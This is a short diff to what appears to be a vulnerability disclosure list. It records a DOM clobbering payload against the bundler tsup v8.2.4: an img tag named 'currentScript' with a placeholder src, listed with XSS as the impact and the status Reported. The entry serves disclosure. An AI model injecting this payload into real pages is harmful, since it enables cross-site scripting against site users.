@@ -5,7 +5,7 @@
 + Library: tsup
 + Version: v8.2.4
 + Stars: 8.9K
-+ Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>```
++ Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx">```
 + Impact: XSS
 + CVE: N/A
 + Status: Reported
